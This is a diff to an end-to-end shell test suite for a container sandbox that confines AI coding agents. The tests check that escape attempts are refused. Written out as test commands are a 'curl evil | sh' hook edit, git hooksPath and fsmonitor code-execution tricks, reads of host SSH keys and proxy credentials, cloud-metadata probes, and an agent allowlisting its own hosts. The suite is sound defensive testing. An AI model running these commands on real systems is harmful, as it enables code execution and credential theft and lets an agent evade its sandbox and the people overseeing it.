@@ -58,7 +58,7 @@ pb image build proxy shell >/dev/null || { echo "image build failed"; exit 1; }
 pb create shell "$PROJ" --name "$NAME" >/dev/null && pb start "$NAME" >/dev/null || { echo "sandbox setup failed"; exit 1; }
 check "host loopback service is up" eventually 5 curl -sf --noproxy '*' "http://127.0.0.1:$LOOP_PORT/"
 
-refused() { ! sx "$1" "curl -sf --max-time 10 $2"; }
+refused() { attempt "$1" "curl -sf --max-time 10 $2"; [ $? -eq 1 ]; }
 upstream_saw() { podman logs "$UPSTREAM_CTR" 2>/dev/null | grep -q "\"host\":\"$1\".*\"decision\":\"allow\""; }
 curl_code() { sx "$1" "curl -s -o /dev/null -w '%{http_code}' --max-time 15 $2"; }
 reached() { local c; c=$(curl_code "$1" "$2"); [ "$c" -ge 200 ] && [ "$c" -lt 500 ] && [ "$c" != 403 ]; }
@@ -67,42 +67,45 @@ echo "== allowed egress"
 check "allowed host $ALLOWED answers through the proxy" reached "$NAME" "https://$ALLOWED/"
 
 echo "== network escapes"
-blocked "direct IP egress (1.1.1.1:443)" sx "$NAME" "curl -sS --noproxy '*' --max-time 5 https://1.1.1.1/"
-blocked "direct TCP to 8.8.8.8:53" sx "$NAME" "timeout 5 bash -c 'exec 3<>/dev/tcp/8.8.8.8/53'"
-blocked "external DNS resolution" sx "$NAME" "getent hosts example.com"
-blocked "DNS name without proxy" sx "$NAME" "curl -sS --noproxy '*' --max-time 5 https://$ALLOWED/"
+running "$NAME"
+denied "direct IP egress (1.1.1.1:443)" "$NAME" "curl -sS --noproxy '*' --max-time 5 https://1.1.1.1/"
+denied "direct TCP to 8.8.8.8:53" "$NAME" "timeout 5 bash -c 'exec 3<>/dev/tcp/8.8.8.8/53'"
+denied "external DNS resolution" "$NAME" "getent hosts example.com"
+denied "DNS name without proxy" "$NAME" "curl -sS --noproxy '*' --max-time 5 https://$ALLOWED/"
 for target in "host.containers.internal" "169.254.1.2" "10.0.2.2" "127.0.0.1"; do
-	blocked "host loopback service via $target" sx "$NAME" "curl -sf --noproxy '*' --max-time 5 http://$target:$LOOP_PORT/"
+	denied "host loopback service via $target" "$NAME" "curl -sf --noproxy '*' --max-time 5 http://$target:$LOOP_PORT/"
 done
-blocked "default route present" sx "$NAME" "awk '\$2 == \"00000000\" {found=1} END {exit !found}' /proc/net/route"
-blocked "host loopback through the proxy (127.0.0.1)" sx "$NAME" "curl -sf --max-time 5 http://127.0.0.1:$LOOP_PORT/"
-blocked "host service through the proxy (host.containers.internal)" sx "$NAME" "curl -sf --max-time 5 http://host.containers.internal:$LOOP_PORT/"
-blocked "cloud metadata through the proxy" sx "$NAME" "curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/"
-blocked "host proxy variable inherited" sx "$NAME" "env | grep -iE '^(https?|no|all)_proxy=' | grep -vE '=(http://proxy:3128|localhost,127.0.0.1)\$' | grep -q ."
+denied "default route present" "$NAME" "awk '\$2 == \"00000000\" {found=1} END {exit !found}' /proc/net/route"
+denied "host loopback through the proxy (127.0.0.1)" "$NAME" "curl -sf --max-time 5 http://127.0.0.1:$LOOP_PORT/"
+denied "host service through the proxy (host.containers.internal)" "$NAME" "curl -sf --max-time 5 http://host.containers.internal:$LOOP_PORT/"
+denied "cloud metadata through the proxy" "$NAME" "curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/"
+denied "host proxy variable inherited" "$NAME" "env | grep -iE '^(https?|no|all)_proxy=' | grep -vE '=(http://proxy:3128|localhost,127.0.0.1)\$' | grep -q ."
 
 echo "== filesystem escapes"
-blocked "read host ~/.ssh ($HOSTDIR/.ssh/id_e2e)" sx "$NAME" "cat '$HOSTDIR/.ssh/id_e2e'"
+running "$NAME"
+denied "read host ~/.ssh ($HOSTDIR/.ssh/id_e2e)" "$NAME" "cat '$HOSTDIR/.ssh/id_e2e'"
 check "project .env is empty" sx "$NAME" "[ ! -s '$PROJ/.env' ]"
 check "project .ssh/ is empty" sx "$NAME" "[ -z \"\$(ls -A '$PROJ/.ssh')\" ]"
 HOOK=$(sha256sum <"$PROJ/.git/hooks/pre-commit")
 check "project .git/hooks/pre-commit visible" sx "$NAME" "grep -q hook-ran '$PROJ/.git/hooks/pre-commit'"
-blocked "agent adds a hook" sx "$NAME" "touch '$PROJ/.git/hooks/post-checkout'"
-blocked "agent writes .git/hooks/pre-commit" sx "$NAME" "echo 'echo pwned' >>'$PROJ/.git/hooks/pre-commit'"
-blocked "agent replaces .git/hooks/pre-commit" sx "$NAME" "printf 'echo pwned' >/tmp/h && mv -f /tmp/h '$PROJ/.git/hooks/pre-commit'"
-blocked "agent renames .git/hooks" sx "$NAME" "mv '$PROJ/.git/hooks' '$PROJ/.git/hooks-old'"
+denied "agent adds a hook" "$NAME" "touch '$PROJ/.git/hooks/post-checkout'"
+denied "agent writes .git/hooks/pre-commit" "$NAME" "echo 'echo pwned' >>'$PROJ/.git/hooks/pre-commit'"
+denied "agent replaces .git/hooks/pre-commit" "$NAME" "printf 'echo pwned' >/tmp/h && mv -f /tmp/h '$PROJ/.git/hooks/pre-commit'"
+denied "agent renames .git/hooks" "$NAME" "mv '$PROJ/.git/hooks' '$PROJ/.git/hooks-old'"
 check ".git/hooks/pre-commit unchanged on the host" test "$(sha256sum <"$PROJ/.git/hooks/pre-commit")" = "$HOOK"
 check "masked files intact on the host" grep -q leaked "$PROJ/.env"
 check "project files readable and writable" sx "$NAME" "grep -q hello '$PROJ/src/readme.txt' && echo agent >'$PROJ/src/out.txt'"
 check "agent writes are owned by the host user" test "$(stat -c %u "$PROJ/src/out.txt")" = "$(id -u)"
-blocked "podman or docker socket reachable" sx "$NAME" "find / \( -path /proc -o -path /sys \) -prune -o -type s -print 2>/dev/null | grep -q ."
-blocked "container engine binary available" sx "$NAME" "command -v podman || command -v docker"
+denied "podman or docker socket reachable" "$NAME" "find / \( -path /proc -o -path /sys \) -prune -o -type s -print 2>/dev/null | grep -q ."
+denied "container engine binary available" "$NAME" "command -v podman || command -v docker"
 
 echo "== git configuration"
+running "$NAME"
 GITCFG=$(sha256sum <"$PROJ/.git/config")
-blocked "agent sets core.hooksPath" sx "$NAME" "git config core.hooksPath /tmp/x"
-blocked "agent appends to .git/config" sx "$NAME" "echo '[core] fsmonitor = /tmp/x' >>'$PROJ/.git/config'"
-blocked "agent replaces .git/config" sx "$NAME" "cp '$PROJ/.git/config' /tmp/c && mv -f /tmp/c '$PROJ/.git/config'"
-blocked "agent renames .git to plant its own" sx "$NAME" "mv -f '$PROJ/.git' '$PROJ/.git-old'"
+denied "agent sets core.hooksPath" "$NAME" "git config core.hooksPath /tmp/x"
+denied "agent appends to .git/config" "$NAME" "echo '[core] fsmonitor = /tmp/x' >>'$PROJ/.git/config'"
+denied "agent replaces .git/config" "$NAME" "cp '$PROJ/.git/config' /tmp/c && mv -f /tmp/c '$PROJ/.git/config'"
+denied "agent renames .git to plant its own" "$NAME" "mv -f '$PROJ/.git' '$PROJ/.git-old'"
 check ".git/config unchanged on the host" test "$(sha256sum <"$PROJ/.git/config")" = "$GITCFG"
 check "git commit still works in the sandbox" sx "$NAME" "git add src/readme.txt && GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e git commit -qm agent"
 check "agent commit visible on the host" test "$(git -C "$PROJ" log -1 --format=%s 2>/dev/null)" = agent
@@ -131,29 +134,30 @@ rm -f "$PROJ/.git/commondir"
 check "git-check --accept re-records" sh -c "'$PODBOX' git-check '$NAME' --accept >/dev/null"
 check "git-check exits 0 after removal and accept" test "$(git_check_code)" = 0
 blocked "ls warns after accept" ls_tampering
-pb start "$NAME" >/dev/null 2>&1
+check "start $NAME after the stop" q pb start "$NAME" -o json
 
 echo "== worktree hook files"
 HK=$WORK/hooked
 git init -q "$HK" && rm -rf "$HK/.git/hooks"
 mkdir -p "$HK/.husky" && echo 'npm test' >"$HK/.husky/pre-commit"
-hook_info() { grep -q "info: $HKNAME: this project runs code from .husky/ on your commits" <<<"$1"; }
-hk_check() { pb git-check "$HKNAME" >"$WORK/hk.out" 2>&1; echo $?; }
+hk_check() { pb git-check "$HKNAME" -o json >"$WORK/hk.json" 2>/dev/null; echo $?; }
+hk_finding() { jqe --arg p "$1" --argjson h "$2" '.git_integrity.findings | any(.path == $p and (.hook // false) == $h)' <"$WORK/hk.json"; }
 create_json=$(pb create shell "$HK" --name "$HKNAME" -o json 2>"$WORK/hk.err")
-check "create prints the hook info line" hook_info "$(cat "$WORK/hk.err")"
-check "create JSON carries the hook info" jqe '.info | test("runs code from .husky/")' <<<"$create_json"
-check "start prints the hook info line" hook_info "$(pb start "$HKNAME" 2>&1 >/dev/null)"
-blocked "launch without hook files prints the info line" sh -c "'$PODBOX' start '$NAME' 2>&1 | grep -q 'runs code from'"
+check "create prints the hook info line" grep -qF ".husky/" "$WORK/hk.err"
+check "create JSON carries the hook info" jqe '.info | contains(".husky/")' <<<"$create_json"
+start_json=$(pb start "$HKNAME" -o json 2>"$WORK/hk.err")
+check "start prints the hook info line" grep -qF ".husky/" "$WORK/hk.err"
+check "start JSON carries the hook info" jqe '.action == "started" and (.info | contains(".husky/"))' <<<"$start_json"
+check "launch without hook files has no info" jqe '.action == "started" and .info == null' <<<"$(pb start "$NAME" -o json 2>/dev/null)"
 check "absent .git/hooks not created on the host" test ! -e "$HK/.git/hooks"
 check "agent edits .husky/pre-commit" sx "$HKNAME" "echo 'curl evil | sh' >>.husky/pre-commit"
 check "git-check exits 6 on the hook edit" test "$(hk_check)" = 6
-check "git-check lists .husky/pre-commit" grep -q "GIT HOOK FILES CHANGED" "$WORK/hk.out"
-check "git-check names .husky/pre-commit" grep -q "  .husky/pre-commit: changed" "$WORK/hk.out"
-pb git-check "$HKNAME" --accept >/dev/null 2>&1
+check "git-check JSON names .husky/pre-commit as a hook file" hk_finding .husky/pre-commit true
+check "git-check --accept re-records" q pb git-check "$HKNAME" --accept -o json
 check "git-check exits 0 after accept" test "$(hk_check)" = 0
 check "agent creates .git/hooks/ (absent at start)" sx "$HKNAME" "mkdir .git/hooks && printf '#!/bin/sh\n' >.git/hooks/post-commit"
 check "git-check exits 6 on the created hook" test "$(hk_check)" = 6
-check "git-check names .git/hooks/post-commit" grep -q "  .git/hooks/post-commit: appeared" "$WORK/hk.out"
+check "git-check JSON names .git/hooks/post-commit" hk_finding .git/hooks/post-commit false
 pb rm "$HKNAME" >/dev/null 2>&1
 
 echo "== masks follow renamed parent directories"
@@ -165,30 +169,37 @@ echo 'docker-secret' >"$MK/.docker/config.json"
 printf '/config/prod.yaml\nsecret/data.txt\n' >"$MK/.sandboxignore"
 printf 'rules:\n  - host: %s\n    allow: true\n' "$ATTACK" >"$MK/.podbox/policy.yaml"
 mk_json=$(pb create shell "$MK" --name "$MKNAME" -o json 2>"$WORK/mk.err")
-check "create prints each imported project rule" grep -q "$MKNAME: imported rule from .podbox/policy.yaml: allow $ATTACK" "$WORK/mk.err"
-check "create prints each imported .sandboxignore pattern" grep -q "$MKNAME: imported .sandboxignore pattern: /config/prod.yaml" "$WORK/mk.err"
-check "create JSON lists the imports" jqe --arg r "allow $ATTACK" '(.imported.rules | index($r)) != null and (.imported.ignore | length) == 2' <<<"$mk_json"
-pb start "$MKNAME" >/dev/null 2>&1
+check "create prints each imported project rule" grep -qF "allow $ATTACK" "$WORK/mk.err"
+check "create prints each imported .sandboxignore pattern" grep -qF "/config/prod.yaml" "$WORK/mk.err"
+check "create JSON lists the imports" jqe --arg r "allow $ATTACK" '.imported.rules == [$r] and .imported.ignore == ["/config/prod.yaml", "secret/data.txt"]' <<<"$mk_json"
+check "start $MKNAME" q pb start "$MKNAME" -o json
 check "masked files hidden before the rename" sx "$MKNAME" "[ ! -s config/prod.yaml ] && [ ! -s secret/data.txt ] && [ ! -s .docker/config.json ]"
 check "agent renames the parents of masked files" sx "$MKNAME" "mv config config2 && mv secret s2 && mv .docker dk2"
-pb stop "$MKNAME" >/dev/null 2>&1
-pb start "$MKNAME" >/dev/null 2>"$WORK/mk.start"
+check "stop $MKNAME" q pb stop "$MKNAME" -o json
+check "start $MKNAME after the rename" sh -c "'$PODBOX' start '$MKNAME' -o json >/dev/null 2>'$WORK/mk.start'"
 for mv in "config/prod.yaml -> config2/prod.yaml" "secret/data.txt -> s2/data.txt" ".docker/config.json -> dk2/config.json"; do
-	check "start warns: $mv" grep -qF "  $mv (still masked)" "$WORK/mk.start"
+	check "start warns: $mv" grep -qF "$mv" "$WORK/mk.start"
 done
+running "$MKNAME"
 check "start warning is loud" grep -q "MASKED PATHS MOVED in" "$WORK/mk.start"
 for f in config2/prod.yaml s2/data.txt dk2/config.json; do
-	blocked "read $f after rename + stop/start" sx "$MKNAME" "grep -q secret $f"
+	denied "read $f after rename + stop/start" "$MKNAME" "grep -q secret $f"
 done
 check "renamed secrets intact on the host" grep -q prod-secret "$MK/config2/prod.yaml"
-mk_reload() { pb policy reload "$MKNAME" 2>/dev/null; }
-mk_hidden() { for f in config2/prod.yaml s2/data.txt; do ! sx "$MKNAME" "grep -q secret $f" || return 1; done; }
-blocked "plain policy reload after the rename drops a moved mask" grep -q -- "- mask" <<<"$(mk_reload)"
-pb stop "$MKNAME" >/dev/null 2>&1 && pb start "$MKNAME" >/dev/null 2>&1
+mk_reload_keeps() { pb policy reload "$MKNAME" -o json 2>/dev/null | jqe '(.masks_dropped // []) == []'; }
+mk_hidden() {
+	local f
+	for f in config2/prod.yaml s2/data.txt; do
+		attempt "$MKNAME" "grep -q secret $f"
+		[ $? -eq 1 ] || return 1
+	done
+}
+check "plain policy reload after the rename drops no mask (JSON)" mk_reload_keeps
+check "restart $MKNAME after the reload" restart "$MKNAME"
 check "moved files still masked after reload + stop/start" mk_hidden
 : >"$MK/.sandboxignore"
-blocked "reload without the patterns drops a moved mask" grep -q -- "- mask" <<<"$(mk_reload)"
-pb stop "$MKNAME" >/dev/null 2>&1 && pb start "$MKNAME" >/dev/null 2>&1
+check "reload without the patterns drops no moved mask (JSON)" mk_reload_keeps
+check "restart $MKNAME after the second reload" restart "$MKNAME"
 check "moved files still masked without their patterns" mk_hidden
 pb rm "$MKNAME" >/dev/null 2>&1
 
@@ -197,33 +208,33 @@ UR=$WORK/unreadable
 mkdir -p "$UR/sub/.ssh" "$UR/sub2"
 echo 'ssh-secret-x' >"$UR/sub/.ssh/id_x"
 echo 'ENV_SECRET_X=1' >"$UR/sub2/.env"
-ur_start() { pb start "$URNAME" >/dev/null 2>"$WORK/ur.err"; echo $?; }
-ur_leak() { ! sx "$URNAME" "chmod 755 '$UR/sub' '$UR/sub2' 2>/dev/null; cat '$UR/sub/.ssh/id_x' '$UR/sub2/.env' 2>/dev/null" | grep -q SECRET; }
-pb create shell "$UR" --name "$URNAME" >/dev/null 2>&1 && pb start "$URNAME" >/dev/null 2>&1
+ur_start() { pb start "$URNAME" -o json >"$WORK/ur.json" 2>/dev/null; echo $?; }
+ur_leak() { attempt "$URNAME" "chmod 755 '$UR/sub' '$UR/sub2'; cat '$UR/sub/.ssh/id_x' '$UR/sub2/.env' | grep -q SECRET"; [ $? -eq 1 ]; }
+check "create and start $URNAME" up "$URNAME" "$UR"
 check "agent makes the parents of masked files unreadable" sx "$URNAME" "chmod 000 '$UR/sub' '$UR/sub2'"
-pb stop "$URNAME" >/dev/null 2>&1
+check "stop $URNAME" q pb stop "$URNAME" -o json
 check "start refused (exit 7)" test "$(ur_start)" = 7
+check "refusal JSON kind is masks" jqe '.error.kind == "masks"' <"$WORK/ur.json"
 ur_none() { [ -z "$(podman ps -a -q --filter label=io.podbox.sandbox="$URNAME")" ]; }
 check "refused start leaves no podbox container" ur_none
 echo 'extra.txt' >>"$UR/.sandboxignore"
-ur_reload() { pb policy reload "$URNAME" >"$WORK/ur.reload" 2>&1; echo $?; }
+ur_reload() { pb policy reload "$URNAME" -o json >"$WORK/ur.reload" 2>/dev/null; echo $?; }
 check "policy reload refused on the unreadable directory (exit 7)" test "$(ur_reload)" = 7
 check "refused reload refused again (snapshot untouched)" test "$(ur_reload)" = 7
-check "refusal names the path and the host fix" grep -qF "cannot read $UR/sub" "$WORK/ur.err"
-check "refusal says chmod u+rx" grep -qF "chmod u+rx" "$WORK/ur.err"
-check "secrets never printed after the refused start" ur_leak
+check "refusal names the path and the host fix" jqe --arg p "$UR/sub" '.error.message | contains($p) and contains("chmod u+rx")' <"$WORK/ur.json"
+check "refused start leaves the sandbox stopped" sh -c "! '$PODBOX' exec '$URNAME' -- true </dev/null >/dev/null 2>&1"
 chmod u+rx "$UR/sub" "$UR/sub2"
-check "reload after the fix still shows the pattern" grep -qxF "+ ignore extra.txt" <<<"$(pb policy reload "$URNAME" 2>/dev/null)"
+check "reload after the fix still shows the pattern" jqe '.ignore_added == ["extra.txt"]' <<<"$(pb policy reload "$URNAME" -o json 2>/dev/null)"
 check "start works once the host restores the permissions" test "$(ur_start)" = 0
 check "files still masked after the restart" ur_leak
-pb stop "$URNAME" >/dev/null 2>&1
+check "stop $URNAME again" q pb stop "$URNAME" -o json
 rm "$UR/sub2/.env"
 check "start refused on a missing masked path (exit 7)" test "$(ur_start)" = 7
-check "refusal lists the missing path" grep -qxF "  sub2/.env" "$WORK/ur.err"
+check "refusal lists the missing path" jqe '.error.kind == "masks" and (.error.message | contains("sub2/.env"))' <"$WORK/ur.json"
 check "refused start on a missing path leaves no podbox container" ur_none
-pb policy reload "$URNAME" >/dev/null 2>&1
+check "plain policy reload keeps the missing record (JSON)" jqe '.masks_missing == ["sub2/.env"] and (.masks_dropped // []) == []' <<<"$(pb policy reload "$URNAME" -o json 2>/dev/null)"
 check "plain policy reload keeps the record" test "$(ur_start)" = 7
-check "policy reload --forget-missing prints the dropped record" grep -qxF -- "- mask sub2/.env (missing)" <<<"$(pb policy reload "$URNAME" --forget-missing 2>/dev/null)"
+check "policy reload --forget-missing reports the dropped record" jqe '.masks_dropped == ["sub2/.env (missing)"]' <<<"$(pb policy reload "$URNAME" --forget-missing -o json 2>/dev/null)"
 check "start works after --forget-missing" test "$(ur_start)" = 0
 check "remaining file still masked" ur_leak
 pb rm "$URNAME" >/dev/null 2>&1
@@ -239,15 +250,17 @@ check "create with hard links of a masked file succeeds" jqe '.action == "create
 blocked "create panics" grep -q panic "$WORK/hl.err"
 hl_start() { pb start "$HLNAME" >/dev/null 2>"$WORK/hl.err"; echo $?; }
 check "start with hard links exits 0" test "$(hl_start)" = 0
+running "$HLNAME"
 for f in q/cred.key q/z.txt q/a.txt; do
-	blocked "read $f (hard link of a masked file)" sx "$HLNAME" "grep -q HL_SECRET q/${f#q/}"
+	denied "read $f (hard link of a masked file)" "$HLNAME" "grep -q HL_SECRET q/${f#q/}"
 done
 check "agent creates a secret and hard links to it" sx "$HLNAME" "echo HL_SECRET_2 >n.key && ln n.key n2 && ln n.key 0first"
-pb stop "$HLNAME" >/dev/null 2>&1
+check "stop $HLNAME" q pb stop "$HLNAME" -o json
 check "start after the agent's hard links exits 0" test "$(hl_start)" = 0
+running "$HLNAME"
 blocked "start after the agent's hard links panics" grep -q panic "$WORK/hl.err"
 for f in n.key n2 0first; do
-	blocked "read $f after stop/start" sx "$HLNAME" "grep -q HL_SECRET $f"
+	denied "read $f after stop/start" "$HLNAME" "grep -q HL_SECRET $f"
 done
 check "secrets intact on the host" grep -q HL_SECRET_2 "$HL/n2"
 pb rm "$HLNAME" >/dev/null 2>&1
@@ -256,12 +269,12 @@ echo "== linked worktree git directory"
 WTP=$WORK/wtmain
 git init -q "$WTP" && git -C "$WTP" -c user.name=a -c user.email=a@e2e commit -q --allow-empty -m init
 git -C "$WTP" worktree add -q ../wt 2>/dev/null
-wt_check() { pb git-check "$WTNAME" >"$WORK/wt.out" 2>&1; echo $?; }
-pb create shell "$WTP" --name "$WTNAME" >/dev/null 2>&1 && pb start "$WTNAME" >/dev/null 2>&1
+wt_check() { pb git-check "$WTNAME" -o json >"$WORK/wt.json" 2>/dev/null; echo $?; }
+check "create and start $WTNAME" up "$WTNAME" "$WTP"
 check "git-check exits 0 with a host linked worktree" test "$(wt_check)" = 0
 check "agent plants a git directory and repoints the worktree commondir" sx "$WTNAME" "mkdir -p evil/objects evil/refs && echo 'ref: refs/heads/main' >evil/HEAD && printf '[core]\n\tfsmonitor = touch /tmp/pwned\n' >evil/config && echo ../../../evil >.git/worktrees/wt/commondir"
 check "git-check exits 6 on the worktree commondir" test "$(wt_check)" = 6
-check "git-check names .git/worktrees/wt/commondir" grep -q "  .git/worktrees/wt/commondir: changed" "$WORK/wt.out"
+check "git-check JSON names .git/worktrees/wt/commondir" jqe '.git_integrity.findings | any(.path == ".git/worktrees/wt/commondir")' <"$WORK/wt.json"
 pb rm "$WTNAME" >/dev/null 2>&1
 
 echo "== refused workspaces"
@@ -277,6 +290,7 @@ check "start refuses a workspace now resolving to PODBOX_HOME (exit 2)" refused_
 pb rm "$MVNAME" >/dev/null 2>&1
 
 echo "== privileges"
+running "$NAME"
 check "uid 1000" test "$(sx "$NAME" 'id -u')" = 1000
 check "no effective capabilities" test "$(sx "$NAME" "awk '/^CapEff/ {print \$2}' /proc/self/status")" = 0000000000000000
 check "no_new_privs set" test "$(sx "$NAME" "awk '/^NoNewPrivs/ {print \$2}' /proc/self/status")" = 1
@@ -289,36 +303,37 @@ check "port refusal names the --port fix" grep -q "podbox policy allow $NAME $AL
 echo "== allowlist and hot reload"
 body=$(sx "$NAME" "curl -s --max-time 10 http://$EXTRA/")
 check "non-allowlisted host gets the readable refusal" grep -q "Ask the user to run: podbox policy allow $NAME $EXTRA" <<<"$body"
-blocked "non-allowlisted host over TLS" sx "$NAME" "curl -sf --max-time 10 https://$EXTRA/"
+denied "non-allowlisted host over TLS" "$NAME" "curl -sf --max-time 10 https://$EXTRA/"
 pb policy allow "$NAME" "$EXTRA" >/dev/null
 check "allowed after policy allow, without restart" eventually 5 reached "$NAME" "https://$EXTRA/"
 pb policy deny "$NAME" "$EXTRA" >/dev/null
 check "refused again after policy deny" eventually 5 refused "$NAME" "https://$EXTRA/"
 
 echo "== project policy and .sandboxignore tampering"
+running "$NAME"
 # Asserts on the proxy's own decision log: an outer firewall may refuse hosts too.
 proxy_log() { podman logs "podbox-$NAME-proxy" 2>&1 | grep "\"host\":\"$ATTACK\""; }
 probe() { sx "$NAME" "curl -s -o /dev/null --max-time 10 http://$ATTACK/"; }
 denied_only() { probe; proxy_log | grep -q '"decision":"deny"' && ! proxy_log | grep -q '"decision":"allow"'; }
 allowed_by_project() { probe; proxy_log | grep '"decision":"allow"' | grep -q '"layer":"project"'; }
-ls_warns() { pb ls 2>&1 >/dev/null | grep -q "policy reload $NAME"; }
-reload_shows() { grep -qF -- "$1" <<<"$reload_out"; }
+ls_warns() { pb ls -o json 2>/dev/null | jqe --arg n "$NAME" '.[] | select(.name == $n) | (.project_changed // []) | length > 0'; }
 check ".sandboxignore pattern is masked" sx "$NAME" "[ ! -s '$PROJ/notes.txt' ]"
-blocked "agent edits .sandboxignore" sx "$NAME" "echo >'$PROJ/.sandboxignore'"
-blocked "agent removes .sandboxignore" sx "$NAME" "rm -f '$PROJ/.sandboxignore'"
+denied "agent edits .sandboxignore" "$NAME" "echo >'$PROJ/.sandboxignore'"
+denied "agent removes .sandboxignore" "$NAME" "rm -f '$PROJ/.sandboxignore'"
 check "agent writes .podbox/policy.yaml (absent at creation)" sx "$NAME" "mkdir -p '$PROJ/.podbox' && printf 'rules:\n  - host: $ATTACK\n    allow: true\n' >'$PROJ/.podbox/policy.yaml'"
 : >"$PROJ/.sandboxignore" # the tampering a read-only mount prevents, done from the host
 check "ls warns that project files changed" ls_warns
-pb policy allow "$NAME" example.org >/dev/null && pb stop "$NAME" >/dev/null && pb start "$NAME" >/dev/null 2>&1
+check "policy allow example.org" q pb policy allow "$NAME" example.org -o json
+check "restart $NAME after policy allow" restart "$NAME"
 check "self-allowlisted host denied after policy allow + stop/start" denied_only
 check "removed .sandboxignore pattern still masked after stop/start" sx "$NAME" "[ ! -s '$PROJ/notes.txt' ]"
-blocked "agent edits .podbox/ once it exists" sx "$NAME" "echo x >>'$PROJ/.podbox/policy.yaml'"
-reload_out=$(pb policy reload "$NAME" 2>/dev/null)
-check "policy reload shows the added rule" reload_shows "+ rule allow $ATTACK"
-check "policy reload shows the removed pattern" reload_shows "- ignore notes.txt"
+denied "agent edits .podbox/ once it exists" "$NAME" "echo x >>'$PROJ/.podbox/policy.yaml'"
+reload_out=$(pb policy reload "$NAME" -o json 2>/dev/null)
+check "policy reload shows the added rule" jqe --arg r "allow $ATTACK" '.rules_added == [$r]' <<<"$reload_out"
+check "policy reload shows the removed pattern" jqe '.ignore_removed == ["notes.txt"]' <<<"$reload_out"
 check "reloaded project rule applies without restart" eventually 10 allowed_by_project
 rm -rf "$PROJ/.podbox" && echo 'notes.txt' >"$PROJ/.sandboxignore"
-pb policy reload "$NAME" >/dev/null 2>&1
+check "policy reload after restoring the project files" q pb policy reload "$NAME" -o json
 blocked "ls still warns after reload" ls_warns
 
 echo "== project policy reached through an agent symlink (F1)"
@@ -330,7 +345,7 @@ mkdir -p "$PODBOX_HOME/config"
 printf 'rules:\n  - host: %s\n    allow: false\n' "$F1HOST" >"$GLOBAL"
 GLOBAL_SUM=$(sha256sum <"$GLOBAL")
 CONFIG_LS=$(ls -A "$PODBOX_HOME/config")
-pb stop "$NAME" >/dev/null 2>&1 && pb start "$NAME" >/dev/null 2>&1
+check "restart $NAME with the global deny" restart "$NAME"
 check "agent links .podbox to the podbox config directory" sx "$NAME" "ln -s '$PODBOX_HOME/config' '$PROJ/.podbox'"
 f1_refused() { local err; err=$(pb policy allow "$NAME" "$F1HOST" --scope project 2>&1 >/dev/null); [ $? -eq 2 ] && grep -q "symbolic link" <<<"$err"; }
 check "policy allow --scope project through the link refused (exit 2)" f1_refused
@@ -340,7 +355,7 @@ f1_log() { podman logs "podbox-$NAME-proxy" 2>&1 | grep "\"host\":\"$F1HOST\""; 
 f1_global_deny() { sx "$NAME" "curl -s -o /dev/null --max-time 10 http://$F1HOST/"; f1_log | grep '"decision":"deny"' | grep -q '"layer":"global"' && ! f1_log | grep -q '"decision":"allow"'; }
 check "global deny still decides" eventually 10 f1_global_deny
 rm -f "$PROJ/.podbox" "$GLOBAL"
-pb policy reload "$NAME" >/dev/null 2>&1
+check "policy reload after removing the link" q pb policy reload "$NAME" -o json
 
 echo "== corporate upstream proxy (allow-all, basic auth)"
 PROXY_IMG=$(pb image ls -o json | jq -r '[.[] | select(.image == "proxy")][0].ref')
@@ -350,12 +365,12 @@ podman run -d --name "$UPSTREAM_CTR" --network podbox-egress --http-proxy=false 
 	"$PROXY_IMG" --listen :3128 --allow-all >/dev/null
 mkdir -p "$PODBOX_HOME/config"
 printf 'upstream_proxy: http://e2e:s3cret@%s:3128\n' "$UPSTREAM_CTR" >"$PODBOX_HOME/config/config.yaml"
-pb create shell "$PROJ" --name "$UPNAME" >/dev/null 2>&1 && pb start "$UPNAME" >/dev/null 2>&1
+check "create and start $UPNAME" up "$UPNAME" "$PROJ"
 check "allowed host answers through the upstream" reached "$UPNAME" "https://$ALLOWED/"
 check "upstream saw the request" eventually 5 upstream_saw "$ALLOWED"
 check "refusal unchanged behind the upstream" grep -q "podbox policy allow $UPNAME $EXTRA" <<<"$(sx "$UPNAME" "curl -s --max-time 10 http://$EXTRA/")"
-blocked "agent sees upstream credentials" sx "$UPNAME" "env | grep -q s3cret"
-blocked "agent reaches the upstream directly" sx "$UPNAME" "curl -sf --noproxy '*' --max-time 5 -x http://e2e:s3cret@$UPSTREAM_CTR:3128 https://$ALLOWED/"
+denied "agent sees upstream credentials" "$UPNAME" "env | grep -q s3cret"
+denied "agent reaches the upstream directly" "$UPNAME" "curl -sf --noproxy '*' --max-time 5 -x http://e2e:s3cret@$UPSTREAM_CTR:3128 https://$ALLOWED/"
 pb rm "$UPNAME" >/dev/null
 podman rm -f -t 0 "$UPSTREAM_CTR" >/dev/null
 
